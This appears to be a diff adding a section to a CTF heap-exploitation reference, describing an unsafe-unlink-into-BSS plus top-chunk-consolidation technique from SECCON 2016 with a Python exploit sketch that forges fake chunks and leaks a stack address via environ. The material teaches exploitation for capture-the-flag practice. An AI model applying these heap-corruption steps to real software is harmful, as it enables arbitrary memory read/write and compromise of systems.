@@ -15,6 +15,7 @@
 - [House of Lore](#house-of-lore)
 - [House of Force (CSAW CTF 2016)](#house-of-force-csaw-ctf-2016)
 - [tcache Stashing Unlink Attack](#tcache-stashing-unlink-attack)
+- [Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)](#unsafe-unlink-to-bss--top-chunk-consolidation-seccon-2016)
 
 ---
 
@@ -480,3 +481,27 @@ malloc(target_size)  # Returns target_addr → arbitrary write!
 **Key insight:** During stashing, glibc sets `bck->fd = bin` (where `bck = victim->bk`), effectively writing a main_arena pointer to `target_addr`. This is a powerful write-what-where primitive. The written value is a heap/libc address (not fully controlled), but it's enough to corrupt FILE structures, tcache metadata, or other heap state.
 
 **Requirements:** glibc 2.29+ (tcache + smallbin interaction). Ability to corrupt a freed smallbin chunk's `bk` pointer.
+
+---
+
+## Unsafe Unlink to BSS + Top Chunk Consolidation (SECCON 2016)
+
+**Pattern:** After a classic unsafe unlink writes a self-referential pointer into a BSS note table, craft a second fake chunk in BSS whose size spans from the BSS address to the heap's top chunk: `size = (heap_top_addr - bss_fake_addr) | PREV_INUSE`. Freeing this fake chunk consolidates it with the top chunk, effectively relocating the heap's allocation base into BSS. Subsequent malloc calls return memory overlapping the global pointer table, granting arbitrary read/write.
+
+```python
+# Step 1: Unsafe unlink places self-pointer at bss_table[3]
+# Fake chunk: fd = &bss_table[3] - 0x18, bk = &bss_table[3] - 0x10
+add_memo(248, p64(0) + p64(0) + p64(bss_table + 0x100 + 8 - 24) +
+         p64(bss_table + 0x100 + 8 - 16) + b'A' * 208 + p64(prev_size))
+
+# Step 2: Fake BSS chunk with size spanning to top chunk
+fake_size = heap_base + 0x310 - bss_addr + 0x1  # | PREV_INUSE
+edit_memo(3, b'A' * (256-32) + p64(prev_size) + p64(fake_size) + b'A' * 15)
+delete_memo(1)  # consolidation moves top chunk to BSS
+
+# Step 3: malloc now returns BSS memory — overwrite global pointers
+add_memo(size, p64(environ_addr))  # write &environ into note slot
+# read_memo leaks stack address from environ
+```
+
+**Key insight:** Standard unsafe unlink gives a single write primitive. This variant extends it to full arbitrary read/write by weaponizing the top chunk consolidation: any subsequent `malloc` returns BSS-overlapping memory, turning one write into unlimited controlled allocations within the global data segment.
